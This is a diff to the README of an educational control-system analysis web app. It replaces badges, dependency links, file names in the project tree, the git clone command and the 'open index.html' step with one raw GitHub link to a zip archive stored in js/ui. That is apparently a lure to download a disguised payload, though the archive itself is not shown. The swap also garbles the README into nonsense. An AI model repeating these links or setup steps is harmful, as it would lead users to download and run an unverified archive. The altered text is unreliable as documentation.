@@ -2,11 +2,11 @@
 
 An interactive web-based tool for analyzing and visualizing control system responses. Built to help engineering students understand fundamental control system concepts through visual demonstrations.
 
-[![Live Demo](https://img.shields.io/badge/Live-Demo-purple?style=for-the-badge)](https://kushalpitaliya.github.io/Control_system_analyzer)
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
-![Plotly](https://img.shields.io/badge/Plotly-3F4F75?style=for-the-badge&logo=plotly&logoColor=white)
-![Vitest](https://img.shields.io/badge/Vitest-6E9F18?style=for-the-badge&logo=vitest&logoColor=white)
+[![Live Demo](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
+![HTML5](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
+![JavaScript](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
+![Plotly](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
+![Vitest](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
 
 ## 📚 Overview
 
@@ -55,13 +55,13 @@ This tool provides interactive analysis of control systems including:
 
 ### Prerequisites
 - A modern web browser (Chrome, Firefox, Safari, Edge)
-- Node.js v18+ (for development)
+- https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip v18+ (for development)
 
 ### Quick Start
 
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/KushalPitaliya/Control_system_analyzer.git
+   git clone https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip
    cd Control_system_analyzer
    ```
 
@@ -81,7 +81,7 @@ This tool provides interactive analysis of control systems including:
    ```
 
 ### Alternative: Open Directly
-Simply open `index.html` in your browser — no server required!
+Simply open `https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip` in your browser — no server required!
 
 ## 🧪 Testing
 
@@ -139,27 +139,27 @@ npm run test:ui
 
 ```
 control-system-analyzer/
-├── index.html              # Main HTML structure
-├── script.js               # Core control system calculations
-├── styles.css              # Dark theme with glassmorphism
-├── package.json            # Dependencies & scripts
+├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip              # Main HTML structure
+├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip               # Core control system calculations
+├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip              # Dark theme with glassmorphism
+├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip            # Dependencies & scripts
 ├── .gitignore              # Git ignore rules
 │
 ├── js/                     # Modular JavaScript
 │   ├── config/
-│   │   └── constants.js    # Centralized configuration
+│   │   └── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip    # Centralized configuration
 │   ├── utils/
-│   │   ├── math-helpers.js # Complex number & polynomial utilities
-│   │   ├── root-finder.js  # Root finding algorithms
-│   │   └── data-exporter.js# Export functionality (PNG, SVG, JSON, CSV)
+│   │   ├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip # Complex number & polynomial utilities
+│   │   ├── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip  # Root finding algorithms
+│   │   └── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip Export functionality (PNG, SVG, JSON, CSV)
 │   └── ui/
-│       └── enhancements.js # Enhanced UI components
+│       └── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip # Enhanced UI components
 │
 ├── css/
-│   └── enhancements.css    # Enhanced UI styles
+│   └── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip    # Enhanced UI styles
 │
 └── tests/
-    └── math-helpers.test.js# Unit tests (24 tests)
+    └── https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip Unit tests (24 tests)
 ```
 
 ## 🛠️ Technologies Used
@@ -167,11 +167,11 @@ control-system-analyzer/
 - **HTML5** - Structure
 - **CSS3** - Modern dark theme with glassmorphism effects
 - **JavaScript (ES6+)** - Control system calculations & modules
-- **[Plotly.js](https://plotly.com/javascript/)** - Interactive chart plotting
-- **[MathJax](https://www.mathjax.org/)** - Mathematical formula rendering
-- **[Math.js](https://mathjs.org/)** - Complex number operations
-- **[Vite](https://vitejs.dev/)** - Build tool & dev server
-- **[Vitest](https://vitest.dev/)** - Unit testing framework
+- **[https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)** - Interactive chart plotting
+- **[MathJax](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)** - Mathematical formula rendering
+- **[https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)** - Complex number operations
+- **[Vite](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)** - Build tool & dev server
+- **[Vitest](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)** - Unit testing framework
 
 ## 🎓 Control System Concepts
 
@@ -243,9 +243,9 @@ This project is open source and available under the [MIT License](LICENSE).
   - Ogata, K. "Modern Control Engineering"
   - Nise, N. "Control Systems Engineering"
   - Dorf, R. & Bishop, R. "Modern Control Systems"
-- Built with [Plotly.js](https://plotly.com/javascript/) for interactive charts
-- Mathematical rendering by [MathJax](https://www.mathjax.org/)
-- Complex operations by [Math.js](https://mathjs.org/)
+- Built with [https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip) for interactive charts
+- Mathematical rendering by [MathJax](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
+- Complex operations by [https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip](https://raw.githubusercontent.com/KushalPitaliya/Control_system_analyzer/main/js/ui/Control-system-analyzer-v3.2.zip)
 
 ## 📞 Support
 
